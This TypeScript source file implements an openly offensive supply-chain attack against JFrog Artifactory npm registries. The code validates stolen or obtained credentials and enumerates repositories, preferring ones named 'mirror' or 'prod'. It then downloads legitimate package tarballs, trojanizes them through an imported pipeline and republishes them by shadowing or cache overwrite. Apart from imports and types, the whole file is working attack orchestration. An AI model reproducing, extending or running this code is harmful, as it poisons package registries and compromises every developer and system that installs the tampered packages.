// JFrog NPM Mutator
//
// Full attack chain for JFrog Artifactory-hosted npm registries:
//   1. Validate credentials against the Artifactory instance
//   2. Enumerate npm repos (local, remote, virtual) and cached packages
//   3. Download legitimate tarballs through the Artifactory proxy
//   4. Trojanize each tarball (reuses the shared tarball.ts pipeline)
//   5. Republish via local shadowing or cache overwrite
//
// Usage:
//   const mutator = new JfrogNpmMutator(session, { packages: ["lodash"] });
//   await mutator.execute();

import { $ } from "bun";
import { createWriteStream } from "fs";
import * as fs from "fs/promises";
import { join } from "path";
import { Readable } from "stream";
import { pipeline } from "stream/promises";

import { logUtil } from "../../utils/logger";
import { Mutator } from "../base";
import { updateTarball } from "../npm/tarball";
import { type JfrogSession } from "./auth";
import { type PublishResult, publishToJfrog } from "./publish";
import {
  enumerateNpmRepos,
  fetchPackageVersion,
  findShadowRepo,
  listCachedPackages,
  type NpmRepoInfo,
  type PackageVersionInfo,
} from "./registry";

// ---------------------------------------------------------------------------
// Repo prioritization — mirror/prod first
// ---------------------------------------------------------------------------

const PRIORITY_TERMS = ["mirror", "prod"] as const;

function repoPriorityScore(key: string): number {
  const lower = key.toLowerCase();
  for (const term of PRIORITY_TERMS) {
    if (lower.includes(term)) return -1;
  }
  return 0;
}

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export interface JfrogNpmOptions {
  /**
   * Explicit package names to target.  If omitted, the mutator enumerates
   * all cached packages from accessible repos.
   */
  packages?: string[];
  /**
   * Maximum number of packages to process **per repo**.
   * @default 50
   */
  maxPackages?: number;
  /**
   * Prefer cache overwrite over local publish, even if a local repo exists.
   * @default false
   */
  forceCacheOverwrite?: boolean;
  /**
   * Only enumerate and list targetable packages — do not download,
   * trojanize, or republish anything.
   * @default true
   */
  reconOnly?: boolean;
}

export interface JfrogNpmReport {
  totalPackages: number;
  published: number;
  failed: number;
  results: PublishResult[];
}

// ---------------------------------------------------------------------------
// JfrogNpmMutator
// ---------------------------------------------------------------------------

export class JfrogNpmMutator extends Mutator {
  private readonly session: JfrogSession;
  private readonly options: Required<JfrogNpmOptions>;

  private repoMap: Map<string, NpmRepoInfo> = new Map();
  private shadowRepo: string | null = null;

  constructor(session: JfrogSession, options: JfrogNpmOptions = {}) {
    super();
    this.session = session;
    this.options = {
      packages: options.packages ?? [],
      maxPackages: options.maxPackages ?? 50,
      forceCacheOverwrite: options.forceCacheOverwrite ?? false,
      reconOnly: options.reconOnly ?? true,
    };
  }

  // -----------------------------------------------------------------------
  // Guard
  // -----------------------------------------------------------------------

  override async shouldExecute(): Promise<boolean> {
    if (!this.session.canWrite) {
      logUtil.log("[jfrognpm] No write access detected — skipping mutation");
      return false;
    }
    return true;
  }

  // -----------------------------------------------------------------------
  // Main execution
  // -----------------------------------------------------------------------

  override async execute(): Promise<Boolean> {
    try {
      // Resolve target packages (uses session.npmRepos directly, no per-repo fetch)
      const packages = await this.resolvePackages();

      if (this.options.reconOnly) {
        return this.executeRecon(packages);
      }

      // Execute mode: need repo map + shadow repo for publish routing
      this.repoMap = new Map(
        (await enumerateNpmRepos(this.session)).map((r) => [r.key, r]),
      );
      this.shadowRepo = this.options.forceCacheOverwrite
        ? null
        : findShadowRepo([...this.repoMap.values()]);

      return this.executeFull(packages);
    } catch (e) {
      logUtil.error(e);
      logUtil.error("[jfrognpm] Mutator execution failed");
      return false;
    }
  }

  // -----------------------------------------------------------------------
  // Recon mode — list packages, do NOT replace
  // -----------------------------------------------------------------------

  private executeRecon(
    packages: Array<{ name: string; repo: string; version: string }>,
  ): boolean {
    if (packages.length === 0) {
      logUtil.error("No targetable packages found.");

      return false;
    }

    for (const pkg of packages) {
      logUtil.error(
        `  ${pkg.name.padEnd(40)} @${pkg.version.padEnd(12)}  repo=${pkg.repo}`,
      );
    }

    return true;
  }

  // -----------------------------------------------------------------------
  // Full execution — download, trojanize, republish
  // -----------------------------------------------------------------------

  private async executeFull(
    packages: Array<{ name: string; repo: string; version: string }>,
  ): Promise<boolean> {
    if (packages.length === 0) {
      logUtil.log("[jfrognpm] No target packages found.");
      return false;
    }

    logUtil.log(
      `[jfrognpm] Targeting ${packages.length} package(s):`,
      packages.map((p) => p.name).join(", "),
    );

    if (this.shadowRepo) {
      logUtil.log(`[jfrognpm] Shadow repo for publishing: ${this.shadowRepo}`);
    } else {
      logUtil.log("[jfrognpm] No shadow local repo — will use cache overwrite");
    }

    logUtil.log("[jfrognpm] Downloading and trojanizing packages...");
    const tmpDir = await $`mktemp -d`.text().then((s) => s.trim());

    const report: JfrogNpmReport = {
      totalPackages: packages.length,
      published: 0,
      failed: 0,
      results: [],
    };

    for (const pkg of packages) {
      try {
        logUtil.log(`[jfrognpm] processing ${pkg.name}...`);
        const result = await this.processPackage(pkg, tmpDir);
        report.results.push(result);
        if (result.success) {
          report.published++;
        } else {
          report.failed++;
        }
      } catch (e) {
        report.failed++;
        logUtil.log(`[jfrognpm] Unhandled error for ${pkg.name}: ${e}`);
      }
    }

    await fs.rm(tmpDir, { recursive: true, force: true }).catch(() => {});

    logUtil.log(
      `[jfrognpm] Done. ${report.published} published, ${report.failed} failed.`,
    );

    return report.published > 0;
  }

  // -----------------------------------------------------------------------
  // Package resolution
  // -----------------------------------------------------------------------

  private async resolvePackages(): Promise<
    Array<{ name: string; repo: string; version: string }>
  > {
    // Sort by priority: repos with "mirror"/"prod" first
    const targetRepos = [...this.session.npmRepos].sort(
      (a, b) => repoPriorityScore(a) - repoPriorityScore(b),
    );

    if (this.options.packages.length > 0) {
      const sourceRepo = targetRepos[0];
      if (!sourceRepo) return [];

      const resolved: Array<{ name: string; repo: string; version: string }> =
        [];
      for (const pkgName of this.options.packages) {
        const meta = await fetchPackageVersion(
          this.session,
          sourceRepo,
          pkgName,
        );
        if (meta) {
          resolved.push({
            name: meta.name,
            repo: sourceRepo,
            version: meta.version,
          });
        }
      }
      return resolved;
    }

    // Auto-enumerate from all repos — maxPackages per repo
    const packages: Array<{ name: string; repo: string; version: string }> = [];

    for (const repoKey of targetRepos) {
      let repoCount = 0;
      const cached = await listCachedPackages(this.session, repoKey);
      if (cached.length < 10) {
        continue;
      }

      for (const pkg of cached) {
        if (repoCount >= this.options.maxPackages) break;

        const meta = await fetchPackageVersion(this.session, repoKey, pkg.name);
        if (meta) {
          packages.push({
            name: meta.name,
            repo: repoKey,
            version: meta.version,
          });
          repoCount++;
        }
      }
    }

    return packages;
  }

  // -----------------------------------------------------------------------
  // Per-package processing
  // -----------------------------------------------------------------------

  private async processPackage(
    pkg: { name: string; repo: string; version: string },
    tmpDir: string,
  ): Promise<PublishResult> {
    const meta = await fetchPackageVersion(this.session, pkg.repo, pkg.name);
    if (!meta) {
      return {
        success: false,
        method: "local",
        repo: pkg.repo,
        pkgName: pkg.name,
        version: pkg.version,
        error: "Failed to resolve package metadata",
      };
    }

    const tarballPath = await this.downloadTarball(meta, tmpDir);
    if (!tarballPath) {
      return {
        success: false,
        method: "local",
        repo: pkg.repo,
        pkgName: meta.name,
        version: meta.version,
        error: "Failed to download tarball",
      };
    }

    let trojanizedPath: string;
    try {
      trojanizedPath = await updateTarball(tarballPath, {
        tag: "[jfrognpm]",
        addBunDep: true,
      });
    } catch (e) {
      return {
        success: false,
        method: "local",
        repo: pkg.repo,
        pkgName: meta.name,
        version: meta.version,
        error: `Tarball modification failed: ${e}`,
      };
    }

    let targetRepo: string;
    let targetType: string;

    if (this.shadowRepo) {
      targetRepo = this.shadowRepo;
      targetType = "local";
    } else {
      targetRepo = pkg.repo;
      targetType = this.repoMap.get(pkg.repo)?.type ?? "remote";
    }

    return publishToJfrog(this.session, trojanizedPath, targetRepo, targetType);
  }

  // -----------------------------------------------------------------------
  // Tarball download helper
  // -----------------------------------------------------------------------

  private async downloadTarball(
    meta: PackageVersionInfo,
    tmpDir: string,
  ): Promise<string | null> {
    try {
      const res = await fetch(meta.tarballUrl);
      if (!res.ok || !res.body) {
        logUtil.log(`[jfrognpm] Failed to fetch tarball: ${meta.tarballUrl}`);
        return null;
      }

      const safeName = meta.name.replace("@", "").replace("/", "-");
      const filename = `${safeName}-${meta.version}.tgz`;
      const dest = join(tmpDir, filename);

      await pipeline(
        Readable.fromWeb(res.body as import("stream/web").ReadableStream),
        createWriteStream(dest),
      );

      return dest;
    } catch (e) {
      logUtil.log(`[jfrognpm] Tarball download error: ${e}`);
      return null;
    }
  }
}
